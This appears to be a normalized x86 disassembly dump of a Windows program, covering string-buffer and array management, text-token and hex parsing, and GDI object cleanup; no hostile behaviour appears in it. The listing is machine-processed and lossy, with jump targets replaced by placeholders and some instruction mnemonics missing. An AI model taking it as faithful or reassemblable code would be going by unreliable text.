lea edi [ edx + edx ]
test edi edi
jl r-xdata
lea edi [ eax + 0x1 ]
jmp r-xdata
push 0x80004005
call sub_427e00
xor eax eax
pop edi
retn
cmp edi 0x1fffffff
ja r-xdata
push 0x4
push edi
push ecx
call sub_4413da
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] eax
sub_41f8f0
push esi
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop esi
retn
cmp esi [ edi + 0x4 ]
jge r-xdata
mov eax [ edi ]
mov eax [ eax + esi * 4 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ edi + 0x4 ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
dec [ edi + 0x4 ]
mov eax 0x1
pop esi
retn
mov ecx [ edi ]
sub eax esi
add eax eax
add eax eax
lea ecx [ ecx + esi * 4 ]
lea edx [ eax - 0x4 ]
push edx
lea esi [ ecx + 0x4 ]
push esi
push eax
push ecx
call sub_43fbf5
push eax
call sub_4237a0
add esp 0x14
sub_41f960
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
push edi
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov edx [ esi ]
cmp ebx edx
jb r-xdata
inc [ esi + 0x4 ]
mov eax 0x1
pop edi
retn
mov edx [ ebx ]
mov [ eax ] edx
test eax eax
jne r-xdata
lea edi [ edx + eax * 4 ]
cmp ebx edi
jae r-xdata
lea edi [ ecx + ecx ]
test edi edi
jl r-xdata
lea edi [ eax + 0x1 ]
jmp r-xdata
push 0x80004005
call sub_427e00
xor eax eax
pop edi
retn
cmp edi 0x1fffffff
ja r-xdata
push 0x4
push edi
push edx
call sub_4413da
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] eax
sub_41f9d0
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
retn 0x4
cmp esi 0x7ffffffe
jbe r-xdata
test eax eax
jl r-xdata
mov eax esi
jmp sub_421180
xor ecx ecx
mov eax 0x80070057
mov [ edx ] cx
sub_41fa10
cmp eax 0xffffffff
jne r-xdata
test eax eax
jl r-xdata
mov eax [ esi ]
mov ecx [ eax - 0x8 ]
test eax eax
je r-xdata
push 0x80070057
call sub_427e00
mov ecx [ esi ]
cmp eax [ ecx - 0x8 ]
jg r-xdata
push ecx
push eax
call sub_441891
add esp 0x8
mov [ ecx - 0xc ] eax
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
retn
sub_41fa50
test ecx ecx
jl r-xdata
xor eax eax
retn
mov eax [ edi + 0x4 ]
cmp ecx eax
jge r-xdata
lea edx [ eax - 0x1 ]
cmp ecx edx
je r-xdata
dec [ edi + 0x4 ]
mov eax 0x1
retn
sub eax ecx
push esi
mov esi [ edi ]
add eax eax
add eax eax
lea ecx [ esi + ecx * 4 ]
lea edx [ eax - 0x4 ]
push edx
lea esi [ ecx + 0x4 ]
push esi
push eax
push ecx
call sub_43fbf5
push eax
call sub_4237a0
add esp 0x14
pop esi
sub_41faa0
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esi ] eax
mov [ esi + 0x14 ] 0x0
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esi + 0x1c ] eax
mov eax esi
retn
sub_41fae0
mov eax [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ eax ]
mov ecx [ esi - 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
mov ebx [ esi - 0xc ]
sub esi 0x10
push edi
call eax
mov edx [ eax ]
push 0x2
mov ecx eax
mov eax [ edx ]
push ebp
call eax
mov edi eax
test edi edi
jne r-xdata
cmp ebx ebp
jge r-xdata
call sub_41fd30
lea eax [ ebp + ebp + 0x2 ]
push eax
lea ecx [ esi + 0x10 ]
push ecx
push eax
lea ebp [ edi + 0x10 ]
push ebp
call sub_43f985
add esp 0x10
mov [ edi + 0x4 ] ebx
lea edx [ esi + 0xc ]
or eax 0xffffffff
[ edx ] eax
dec eax
test eax eax
jg r-xdata
mov ebp ebx
mov ecx [ esp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebp
pop ebp
pop ebx
retn 0x8
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
sub_41fb60
mov eax [ esi ]
mov ecx [ eax - 0x10 ]
sub eax 0x10
cmp [ eax + 0x8 ] edx
jge r-xdata
call sub_41fd30
test edx edx
jle r-xdata
push edi
mov edi [ ecx ]
push 0x2
push edx
push eax
mov eax [ edi + 0x8 ]
call eax
pop edi
test eax eax
jne r-xdata
add eax 0x10
mov [ esi ] eax
retn
sub_41fb90
push esi
mov esi eax
mov eax [ esi ]
mov edx [ eax - 0xc ]
sub eax 0x10
cmp edx ecx
jle r-xdata
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov ecx edx
mov eax [ eax + 0x8 ]
cmp eax ecx
jge r-xdata
push ecx
push esi
call sub_41fae0
pop esi
retn
pop esi
retn
mov edx eax
cmp edx 0x400
jle r-xdata
add edx edx
add edx 0x400
jmp r-xdata
call sub_41fb60
mov edx ecx
cmp edx ecx
jge r-xdata
sub_41fc00
push esi
mov esi eax
test ebx ebx
jne r-xdata
push edi
mov edi [ esp + 0xc ]
test edi edi
jne r-xdata
call sub_41ff00
pop esi
retn 0x4
mov eax [ esi ]
mov edx [ eax - 0x8 ]
mov ecx 0x1
sub ecx [ eax - 0x4 ]
sub edi eax
sub edx ebx
sar edi 0x1
or ecx edx
push ebp
mov ebp [ eax - 0xc ]
jge r-xdata
push 0x80070057
call sub_427e00
mov eax [ esi ]
mov edx [ eax - 0x8 ]
add edx edx
cmp edi ebp
lea ebp [ ebx + ebx ]
push ebp
ja r-xdata
mov ecx ebx
mov eax esi
call sub_41fb90
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_43f985
lea ecx [ eax + edi * 2 ]
push ecx
push edx
push eax
call sub_43fbf5
jmp r-xdata
push 0x80070057
call sub_427e00
mov eax [ esi ]
cmp ebx [ eax - 0x8 ]
jg r-xdata
add esp 0x10
test ebx ebx
jl r-xdata
mov [ eax - 0xc ] ebx
mov eax [ esi ]
xor ecx ecx
mov [ eax + ebp ] cx
pop ebp
pop edi
pop esi
retn 0x4
sub_41fca0
mov ecx [ eax ]
push esi
mov esi [ edi ]
lea eax [ ecx - 0x10 ]
sub esi 0x10
cmp eax esi
je r-xdata
mov eax edi
pop esi
retn
cmp [ esi + 0xc ] 0x0
push ebx
lea ebx [ esi + 0xc ]
jl r-xdata
mov ebx [ ecx - 0xc ]
push ecx
mov eax edi
call sub_41fc00
pop ebx
mov eax edi
pop esi
retn
mov edx [ eax ]
cmp edx [ esi ]
jne r-xdata
push ebp
call sub_41fd40
mov ebp eax
or eax 0xffffffff
[ ebx ] eax
dec eax
test eax eax
jg r-xdata
add ebp 0x10
mov [ edi ] ebp
pop ebp
pop ebx
mov eax edi
pop esi
retn
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
sub_41fd00
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 4 ]
retn
sub_41fd40
push esi
mov esi eax
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push edi
call edx
cmp [ esi + 0xc ] 0x0
lea ecx [ esi + 0xc ]
jl r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ eax ]
mov edx [ edx ]
push 0x2
push ecx
mov ecx eax
call edx
mov edi eax
test edi edi
jne r-xdata
cmp eax [ esi ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
lea eax [ eax + eax + 0x2 ]
push eax
add esi 0x10
push esi
push eax
lea ecx [ edi + 0x10 ]
push ecx
call sub_43f985
add esp 0x10
mov eax edi
pop edi
pop esi
retn
call sub_41fd30
mov edi esi
mov eax 0x1
[ ecx ] eax
mov eax edi
pop edi
pop esi
retn
sub_41fdb0
push 0xffffffff
push sub_4598bd
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
mov eax [ edi ]
sub eax 0x10
call sub_41fd40
add eax 0x10
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0xc ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ esp + 0x10 ] 0x1
mov edx [ edi + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ edi + 0x1c ]
sub eax 0x10
call sub_41fd40
add eax 0x10
mov [ esi + 0x1c ] eax
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_41fe40
push 0xffffffff
push sub_459e35
mov eax [ fs : 0x0 ]
push eax
push ebx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x4 ]
shl eax 0x5
add eax [ esi ]
mov [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ esi ]
cmp edi edx
jb r-xdata
inc [ esi + 0x4 ]
mov eax 0x1
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
add esp 0xc
retn
push eax
call sub_41fdb0
test eax eax
jne r-xdata
mov ebx eax
shl ebx 0x5
add ebx edx
cmp edi ebx
jae r-xdata
lea ebx [ ecx + ecx ]
test ebx ebx
jl r-xdata
lea ebx [ eax + 0x1 ]
jmp r-xdata
push 0x80004005
call sub_427e00
xor eax eax
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
add esp 0xc
retn
cmp ebx 0x3ffffff
ja r-xdata
push 0x20
push ebx
push edx
call sub_4413da
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi ] eax
sub_41ff00
mov ecx [ esi ]
cmp [ ecx - 0xc ] 0x0
lea eax [ ecx - 0x10 ]
push edi
mov edi [ eax ]
je r-xdata
pop edi
retn
cmp [ eax + 0xc ] 0x0
lea edx [ eax + 0xc ]
jge r-xdata
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
cmp [ ecx - 0x8 ] 0x0
jge r-xdata
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
add eax 0x10
mov [ esi ] eax
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx - 0xc ] 0x0
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
retn
push 0x80070057
call sub_427e00
sub_41ff60
push 0xffffffff
push sub_45a5b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x80 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x94 ]
mov edi [ esp + 0x90 ]
test ebp ebp
jne r-xdata
xor eax eax
test ebp ebp
setne al
test eax eax
jne r-xdata
mov ebp r--data
mov eax [ edi + 0x28 ]
lea esi [ edi + 0x28 ]
mov ecx ebp
mov edi edi
push 0x80004005
call sub_427e00
sbb eax eax
sbb eax ebx
test dx dx
je r-xdata
mov ecx [ esp + 0x80 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x78
retn 0x8
cmp [ edi + 0x50 ] ebx
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov [ edi + 0x4c ] ebx
mov [ edi + 0x50 ] ebx
add edi 0x2c
call sub_422960
test ebp ebp
jne r-xdata
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push edi
call edx
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov eax ebp
lea edx [ eax + 0x2 ]
xor eax eax
jmp r-xdata
mov dx [ eax ]
or ebx 0xffffffff
cmp dx [ ecx ]
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov ebx eax
push ebp
mov eax esi
call sub_41fc00
xor edi edi
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x88 ] edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] edi
mov [ esp + 0x50 ] edi
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] edi
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] edi
mov [ esp + 0x88 ] 0x3
lea ebx [ esp + 0x94 ]
lea esi [ esp + 0x30 ]
mov [ esp + 0x94 ] edi
call sub_41f960
lea ebx [ esp + 0x94 ]
lea esi [ esp + 0x48 ]
mov [ esp + 0x94 ] 0xffffffff
call sub_41f960
lea ebx [ esp + 0x94 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x94 ] 0xffffffff
call sub_41f960
lea eax [ esp + 0x94 ]
push eax
call sub_41f770
lea ebx [ esp + 0x94 ]
lea esi [ esp + 0x54 ]
mov [ esp + 0x88 ] 0x4
call sub_41f880
mov [ esp + 0x88 ] 0x3
mov eax [ esp + 0x94 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
lea esi [ eax + 0x10 ]
mov [ esp + 0x94 ] esi
mov [ esp + 0x88 ] 0x5
mov ebx ebp
cmp [ ebp ] di
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
cmp [ esi - 0xc ] edi
je r-xdata
jmp r-xdata
mov edi [ esp + 0x90 ]
mov ebx [ esp + 0x30 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
lea edi [ eax + 0x10 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
mov [ esp + 0x60 ] edi
mov [ esp + 0x74 ] 0x0
call edx
lea ebp [ eax + 0x10 ]
mov [ esp + 0x7c ] ebp
lea eax [ esi - 0x10 ]
add edi 0xfffffff0
mov [ esp + 0x88 ] 0xb
cmp eax edi
je r-xdata
movzx eax [ ebx ]
cmp ax 0x7b
jne r-xdata
add esi 0xfffffff0
mov [ esp + 0x88 ] 0x3
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x0
push 0x0
push edi
call eax
mov ecx [ esp + 0x58 ]
lea eax [ ecx - 0x1 ]
test eax eax
jl r-xdata
cmp [ edi + 0xc ] 0x0
lea ebx [ edi + 0xc ]
jl r-xdata
movzx eax ax
cmp [ ebx + 0x2 ] 0x26
jne r-xdata
lea esi [ esp + 0x54 ]
call sub_41f520
mov eax [ esp + 0x3c ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
cmp eax ecx
jge r-xdata
mov ebx [ esi - 0xc ]
push esi
lea eax [ esp + 0x64 ]
call sub_41fc00
mov ebp [ esp + 0x7c ]
mov ecx [ eax ]
cmp ecx [ edi ]
jne r-xdata
mov cx [ esp + 0x2c ]
mov [ esi + ebp * 2 ] cx
test edi edi
jl r-xdata
mov ecx edi
lea eax [ esp + 0x94 ]
call sub_41fb90
mov esi [ esp + 0x94 ]
cmp [ ebx + 0x4 ] 0x23
jne r-xdata
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov ecx [ esp + 0x54 ]
mov ecx [ ecx + eax * 4 ]
lea eax [ ecx - 0x10 ]
lea esi [ ebp - 0x10 ]
cmp eax esi
je r-xdata
call sub_41fd40
mov esi eax
or edx 0xffffffff
[ ebx ] edx
dec edx
test edx edx
jg r-xdata
push 0x80070057
call sub_427e00
cmp edi [ esi - 0x8 ]
jg r-xdata
push 0x7d
push ebx
call sub_4418b0
mov ebp eax
add esp 0x8
mov [ esp + 0x2c ] ebp
test ebp ebp
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_44120e
add esp 0x4
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ esi + 0xc ] 0x0
lea edi [ esi + 0xc ]
jl r-xdata
add esi 0x10
mov [ esp + 0x60 ] esi
jmp r-xdata
mov ecx [ edi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
call edx
xor edx edx
mov [ esi - 0xc ] edi
mov [ esi + edi * 2 ] dx
movzx eax [ ebx ]
jmp r-xdata
cmp [ esi - 0xc ] 0x0
je r-xdata
push ebx
call sub_44120e
add esp 0x4
mov ecx [ esp + 0x4c ]
lea eax [ ecx - 0x1 ]
test eax eax
jl r-xdata
mov ecx [ esp + 0x40 ]
lea eax [ ecx - 0x1 ]
test eax eax
jl r-xdata
mov ebx [ ecx - 0xc ]
push ecx
lea eax [ esp + 0x80 ]
call sub_41fc00
mov ebp [ esp + 0x7c ]
mov edx [ eax ]
cmp edx [ esi ]
jne r-xdata
xor edi edi
mov ebp [ esi - 0xc ]
mov [ esp + 0x2c ] eax
mov eax [ esi - 0x8 ]
mov ecx 0x1
sub ecx [ esi - 0x4 ]
lea edi [ ebp + 0x1 ]
sub eax edi
or eax ecx
jge r-xdata
mov edi [ esp + 0x34 ]
lea esi [ esp + 0x60 ]
call sub_41faa0
lea eax [ esp + 0x94 ]
mov edi esi
mov [ esp + 0x88 ] 0x6
call sub_41fca0
mov eax [ esp + 0x58 ]
add eax 0xffffffff
js r-xdata
cmp eax ecx
jge r-xdata
cmp eax ecx
jge r-xdata
call sub_41fd40
mov ebp eax
or eax 0xffffffff
[ edi ] eax
dec eax
test eax eax
jg r-xdata
push 0x2
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
add ebx 0x4
call eax
lea edi [ eax + 0x10 ]
mov [ esp + 0x14 ] edi
mov esi [ esp + 0x2c ]
sub esi ebx
sar esi 0x1
mov [ esp + 0x88 ] 0x7
mov eax [ edi - 0x8 ]
mov ecx 0x1
sub ecx [ edi - 0x4 ]
lea ebp [ esi + 0x1 ]
sub eax ebp
or eax ecx
jge r-xdata
cmp eax [ esp + 0x58 ]
jge r-xdata
mov ecx [ esp + 0x48 ]
mov ecx [ esp + 0x3c ]
jmp r-xdata
add ebp 0x10
mov [ esp + 0x7c ] ebp
jmp r-xdata
mov ecx [ esi ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push esi
call eax
push 0x7
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x58 ] 0x1
jle r-xdata
push ebx
mov ecx ebp
mov edx edi
call sub_41f9d0
mov eax esi
lea esi [ esp + 0x14 ]
call sub_41fa10
mov ebx esi
lea esi [ esp + 0x54 ]
call sub_41f880
lea eax [ edi - 0x10 ]
mov [ esp + 0x88 ] 0x5
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx ebp
lea eax [ esp + 0x14 ]
call sub_41fb90
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x54 ]
lea eax [ ecx + eax * 4 ]
lea edi [ esp + 0x7c ]
call sub_41fca0
mov edx [ esp + 0x7c ]
cmp [ edx - 0xc ] 0x0
je r-xdata
cmp eax ecx
jge r-xdata
mov edx [ ecx + eax * 4 ]
mov ecx [ esp + 0x34 ]
lea eax [ ecx - 0x1 ]
mov [ esp + 0x78 ] edx
test eax eax
jl r-xdata
push 0x7
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
lea esi [ esp + 0x18 ]
add ebx 0xe
call sub_4228c0
mov edi ebp
sub edi ebx
sar edi 0x1
lea ebp [ edi + 0x1 ]
push ebx
mov ecx ebp
mov [ esp + 0x8c ] 0x8
call sub_41fbe0
mov esi edi
mov ecx ebp
mov edx eax
call sub_41f9d0
mov eax edi
lea esi [ esp + 0x18 ]
call sub_41fa10
mov ecx [ esp + 0x18 ]
movzx eax [ ecx ]
cmp ax 0x23
jne r-xdata
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
mov eax [ esp + 0x58 ]
dec eax
lea edi [ esp + 0x54 ]
call sub_41f8f0
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
mov eax [ esp + 0x4c ]
dec eax
lea ecx [ esp + 0x48 ]
call sub_41fd00
mov ecx [ eax ]
mov [ esp + 0x78 ] ecx
mov eax [ esp + 0x40 ]
dec eax
lea ecx [ esp + 0x3c ]
call sub_41fd00
mov eax [ eax ]
mov [ esp + 0x78 ] eax
jmp r-xdata
mov ebx [ esp + 0x30 ]
mov eax [ ebx + eax * 4 ]
mov edi [ esp + 0x90 ]
lea ecx [ esp + 0x60 ]
lea esi [ edi + 0x2c ]
mov [ esp + 0x74 ] eax
call sub_41fe40
lea esi [ esp + 0x94 ]
call sub_41ff00
lea eax [ ebp - 0x10 ]
mov [ esp + 0x88 ] 0x5
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push 0x5
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x40 ] 0x1
jle r-xdata
cmp ax 0x30
jne r-xdata
push 0x10
add ecx 0x2
jmp r-xdata
add ebx 0x2
cmp [ ebx ] 0x0
jne r-xdata
cmp eax edi
jge r-xdata
mov edi [ esp + 0x34 ]
lea eax [ edi - 0x1 ]
test eax eax
jl r-xdata
mov eax [ esp + 0x60 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push 0x5
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
lea esi [ esp + 0x1c ]
add ebx 0xa
call sub_4228c0
mov edi ebp
sub edi ebx
sar edi 0x1
lea ebp [ edi + 0x1 ]
push ebx
mov ecx ebp
mov [ esp + 0x8c ] 0x9
call sub_41fbe0
mov esi edi
mov ecx ebp
mov edx eax
call sub_41f9d0
mov eax edi
lea esi [ esp + 0x1c ]
call sub_41fa10
mov eax [ esp + 0x1c ]
push eax
call sub_4410fd
dec eax
add esp 0x4
cmp eax 0x7
ja r-xdata
mov ecx [ esp + 0x40 ]
lea edi [ esp + 0x3c ]
dec ecx
call sub_41fa50
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
push 0xa
movzx eax [ ecx + 0x2 ]
cmp ax 0x78
je r-xdata
lea edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x30 ]
mov eax [ edx + eax * 4 ]
mov esi [ esp + 0x90 ]
lea ecx [ esp + 0x60 ]
add esi 0x2c
mov [ esp + 0x74 ] eax
call sub_41fe40
lea esi [ esp + 0x94 ]
call sub_41ff00
lea esi [ esp + 0x60 ]
mov [ esp + 0x88 ] 0x5
call sub_422920
jmp r-xdata
mov esi [ esp + 0x94 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push 0x6
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
cmp edi 0x1
jle r-xdata
lea ecx [ esp + 0x1c ]
mov [ esp + 0x88 ] 0x5
call sub_422900
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
jmp [ eax * 4 + jump_table_4209a4 ]
push 0x10
lea eax [ esp + 0x28 ]
push eax
add ecx 0x4
jmp r-xdata
cmp ax 0x58
jne r-xdata
push 0x2
add ebx 0x6
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
call sub_422a00
mov ecx [ edi + 0x1c ]
test ecx ecx
je r-xdata
push 0x6
push r--data
push ebx
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
lea esi [ esp + 0x20 ]
add ebx 0xc
call sub_4228c0
mov edi ebp
sub edi ebx
sar edi 0x1
lea ebp [ edi + 0x1 ]
push ebx
mov ecx ebp
mov [ esp + 0x8c ] 0xa
call sub_41fbe0
mov esi edi
mov ecx ebp
mov edx eax
call sub_41f9d0
mov eax edi
lea esi [ esp + 0x20 ]
call sub_41fa10
mov ecx [ esp + 0x20 ]
movzx eax [ ecx ]
cmp ax 0x23
jne r-xdata
mov ecx [ esp + 0x34 ]
dec ecx
lea edi [ esp + 0x30 ]
call sub_41fa50
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ ecx ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x8 ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0xc ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x14 ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0x18 ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax + 0x1c ]
push ecx
call sub_4416d6
add esp 0xc
lea ebx [ esp + 0x14 ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] eax
call sub_41f960
lea ecx [ esp + 0x18 ]
mov [ esp + 0x88 ] 0x5
call sub_422900
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
cmp [ esp + 0x4c ] 0x1
jle r-xdata
cmp ax 0x30
jne r-xdata
push 0x10
add ecx 0x2
jmp r-xdata
lea ebx [ esp + 0x14 ]
lea esi [ esp + 0x30 ]
call sub_41f960
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x4c ]
lea edi [ esp + 0x48 ]
dec ecx
call sub_41fa50
push 0xa
movzx eax [ ecx + 0x2 ]
cmp ax 0x78
je r-xdata
lea edx [ esp + 0x2c ]
push edx
push 0x10
lea eax [ esp + 0x2c ]
push eax
add ecx 0x4
jmp r-xdata
cmp ax 0x58
jne r-xdata
push ecx
call sub_4416d6
add esp 0xc
lea ebx [ esp + 0x14 ]
lea esi [ esp + 0x48 ]
mov [ esp + 0x14 ] eax
call sub_41f960
lea ecx [ esp + 0x20 ]
mov [ esp + 0x88 ] 0x5
call sub_422900
mov ebx [ esp + 0x2c ]
mov esi [ esp + 0x94 ]
jmp r-xdata
sub_4209d0
mov eax [ rw-data ]
push esi
mov esi [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov eax [ rw-data ]
push edi
mov edi r--data
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov [ rw-data ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov [ rw-data ] edi
